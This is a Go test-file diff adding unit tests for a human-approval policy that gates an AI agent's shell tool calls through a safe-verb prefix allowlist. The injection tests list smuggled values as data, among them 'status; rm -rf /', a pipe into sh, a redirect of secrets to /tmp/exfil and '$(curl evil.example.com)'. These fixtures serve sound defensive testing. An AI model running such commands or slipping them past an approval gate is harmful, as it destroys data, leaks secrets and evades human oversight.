@@ -184,3 +184,130 @@ func TestUnit_Evaluate_NoCommandSubstitution_CleanCommandPasses(t *testing.T) {
 		assert.Equal(t, hitlservice.ActionAllow, r.Action, "clean command must not trigger substitution block: %v", args)
 	}
 }
+
+// prefixAllowPolicy writes the shape the shipped envelopes use for the safe-verb
+// tier: an allow rule over a prefix list, with everything else falling through to
+// approve. The default_action is approve here (not allow, as shellPolicy uses) so
+// "did the allow tier fire?" is a real question rather than the fallback.
+func prefixAllowPolicy(t *testing.T, prefixes string) hitlservice.PolicyEvaluator {
+	t.Helper()
+	dir := t.TempDir()
+	src := hitlservice.NewFSPolicySource(dir)
+	writePolicy(t, dir, "hitl-policy.json", []byte(
+		`{"default_action":"approve","rules":[{"tools":"local_shell","tool":"local_shell","action":"allow","when":[{"key":"command","op":"command_prefix_allowlist","value":"`+prefixes+`"}]}]}`))
+	return hitlservice.New(src, testTenant, fixedKVReader{"hitl-policy.json"}, libtracker.NoopTracker{})
+}
+
+// TestUnit_Evaluate_CommandPrefixAllowlist_MatchesSafeVerbs is the point of the
+// operator: the everyday read verbs stop asking.
+func TestUnit_Evaluate_CommandPrefixAllowlist_MatchesSafeVerbs(t *testing.T) {
+	t.Parallel()
+	svc := prefixAllowPolicy(t, "git status,git log,go build,ls,cat")
+
+	allowed := []map[string]any{
+		{"command": "git", "args": []any{"status"}},
+		{"command": "git", "args": "status --short"},
+		{"command": "/usr/bin/git", "args": []any{"log", "--oneline", "-20"}},
+		{"command": "go", "args": []any{"build", "./..."}},
+		{"command": "ls"},
+		{"command": "ls", "args": "-la internal"},
+		{"command": "cat", "args": []any{"go.mod"}},
+		// The command string may carry its own arguments.
+		{"command": "git status"},
+	}
+	for _, args := range allowed {
+		r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", args)
+		require.NoError(t, err)
+		assert.Equal(t, hitlservice.ActionAllow, r.Action, "safe verb must not ask: %v", args)
+	}
+}
+
+// TestUnit_Evaluate_CommandPrefixAllowlist_UnlistedVerbStillAsks verifies the
+// tier only ever ADDS quiet verbs: a sibling subcommand of an allowed one is not
+// allowed by association.
+func TestUnit_Evaluate_CommandPrefixAllowlist_UnlistedVerbStillAsks(t *testing.T) {
+	t.Parallel()
+	svc := prefixAllowPolicy(t, "git status,git log,go build,ls,cat")
+
+	asks := []map[string]any{
+		{"command": "git", "args": []any{"clean", "-fd"}},
+		{"command": "git", "args": []any{"reset", "--hard"}},
+		{"command": "git", "args": []any{"push"}},
+		{"command": "go", "args": []any{"run", "./cmd/x"}},
+		{"command": "git"},  // the bare program is not a listed prefix
+		{"command": "gitk"}, // prefix matching is token-wise, not substring
+		{"command": "rm", "args": "-rf /"},
+		{"command": "curl", "args": "https://example.com"},
+	}
+	for _, args := range asks {
+		r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", args)
+		require.NoError(t, err)
+		assert.Equal(t, hitlservice.ActionApprove, r.Action, "unlisted command must still ask: %v", args)
+	}
+}
+
+// TestUnit_Evaluate_CommandPrefixAllowlist_RefusesNonArgvCalls is the property
+// that makes the tier an allowlist rather than a hole: an allowed verb followed
+// by a shell operator carries the rest of the line in with it, so such a call
+// never matches a prefix at all.
+func TestUnit_Evaluate_CommandPrefixAllowlist_RefusesNonArgvCalls(t *testing.T) {
+	t.Parallel()
+	svc := prefixAllowPolicy(t, "git status,ls,cat,echo")
+
+	smuggled := []map[string]any{
+		{"command": "git", "args": "status; rm -rf /"},
+		{"command": "git", "args": []any{"status", "&&", "rm", "-rf", "/"}},
+		{"command": "ls", "args": "| sh"},
+		{"command": "cat", "args": "secrets > /tmp/exfil"},
+		{"command": "echo", "args": "$(curl evil.example.com)"},
+		{"command": "echo", "args": "`id`"},
+		{"command": "git status; rm -rf /"},
+		// Shell mode itself: whatever the first token is, the string is a
+		// program, not an argv.
+		{"command": "git", "args": []any{"status"}, "shell": true},
+		{"command": "ls", "shell": "true"},
+	}
+	for _, args := range smuggled {
+		r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", args)
+		require.NoError(t, err)
+		assert.Equal(t, hitlservice.ActionApprove, r.Action, "non-argv call must never match a prefix: %v", args)
+	}
+}
+
+// TestUnit_Evaluate_CommandPrefixAllowlist_EmptyListNeverMatches keeps an
+// unconfigured tier inert rather than accidentally universal.
+func TestUnit_Evaluate_CommandPrefixAllowlist_EmptyListNeverMatches(t *testing.T) {
+	t.Parallel()
+	svc := prefixAllowPolicy(t, "")
+
+	r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{"command": "ls"})
+	require.NoError(t, err)
+	assert.Equal(t, hitlservice.ActionApprove, r.Action, "an empty prefix list must match nothing")
+}
+
+// TestUnit_Evaluate_CommandPrefixAllowlist_OrderedBelowDenyTiers verifies the
+// tier ordering the shipped envelopes rely on: a blacklisted or ask-always
+// command keeps its verdict even when a later allow rule would have matched.
+func TestUnit_Evaluate_CommandPrefixAllowlist_OrderedBelowDenyTiers(t *testing.T) {
+	t.Parallel()
+	dir := t.TempDir()
+	src := hitlservice.NewFSPolicySource(dir)
+	writePolicy(t, dir, "hitl-policy.json", []byte(`{"default_action":"approve","rules":[
+		{"tools":"local_shell","tool":"local_shell","action":"deny","when":[{"key":"command","op":"command_blacklist","value":"shred"}]},
+		{"tools":"local_shell","tool":"local_shell","action":"approve","when":[{"key":"command","op":"command_ask_always","value":"cat"}]},
+		{"tools":"local_shell","tool":"local_shell","action":"allow","when":[{"key":"command","op":"command_prefix_allowlist","value":"shred,cat,ls"}]}
+	]}`))
+	svc := hitlservice.New(src, testTenant, fixedKVReader{"hitl-policy.json"}, libtracker.NoopTracker{})
+
+	r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{"command": "shred"})
+	require.NoError(t, err)
+	assert.Equal(t, hitlservice.ActionDeny, r.Action, "a blacklisted command stays denied above the allow tier")
+
+	r, err = svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{"command": "cat"})
+	require.NoError(t, err)
+	assert.Equal(t, hitlservice.ActionApprove, r.Action, "an ask-always command above the allow tier still asks")
+
+	r, err = svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{"command": "ls"})
+	require.NoError(t, err)
+	assert.Equal(t, hitlservice.ActionAllow, r.Action)
+}
